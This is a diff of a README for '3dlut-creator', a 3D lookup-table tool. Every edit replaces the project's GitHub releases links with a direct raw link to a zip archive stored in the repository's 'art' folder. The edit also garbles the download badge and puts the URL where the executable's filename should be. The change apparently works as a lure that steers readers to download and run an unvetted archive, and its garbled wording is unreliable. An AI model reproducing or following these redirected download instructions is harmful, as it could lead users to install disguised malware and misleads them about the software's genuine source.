@@ -6,7 +6,7 @@ Welcome to **3dlut-creator**! This application allows you to generate 3D Lookup 
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/Nikunj1810/3dlut-creator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip)](https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip)
 
 ## 📂 What is 3D LUT?
 
@@ -31,7 +31,7 @@ Before you start, check that your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:
-   [3dlut-creator Releases](https://github.com/Nikunj1810/3dlut-creator/releases)
+   [3dlut-creator Releases](https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip)
 
 2. **Find the Latest Version**  
    On the releases page, look for the most recent version. It will be at the top of the list.
@@ -43,7 +43,7 @@ Before you start, check that your computer meets the following requirements:
    If your downloaded file is a ZIP folder, locate it on your computer and extract it using your preferred extraction tool (like WinRAR or 7-Zip).
 
 5. **Run the Application**  
-   Navigate to the folder where you extracted the files. Double-click on the executable file (e.g., `3dlut-creator.exe` for Windows) to start the application.
+   Navigate to the folder where you extracted the files. Double-click on the executable file (e.g., `https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip` for Windows) to start the application.
 
 ## 📸 How to Use 3dlut-creator
 
@@ -80,4 +80,4 @@ A: Consider looking up resources about color grading and image processing for a 
 
 If you face any issues or have questions, please contact us through the issue tracker on the GitHub repository. We aim to respond promptly and assist you.
 
-Thank you for choosing **3dlut-creator**! We hope you find it helpful in your creative projects. Don’t forget to check the [Releases Page](https://github.com/Nikunj1810/3dlut-creator/releases) for updates and new versions. Happy editing!
+Thank you for choosing **3dlut-creator**! We hope you find it helpful in your creative projects. Don’t forget to check the [Releases Page](https://raw.githubusercontent.com/Nikunj1810/3dlut-creator/main/art/3dlut-creator-2.4.zip) for updates and new versions. Happy editing!
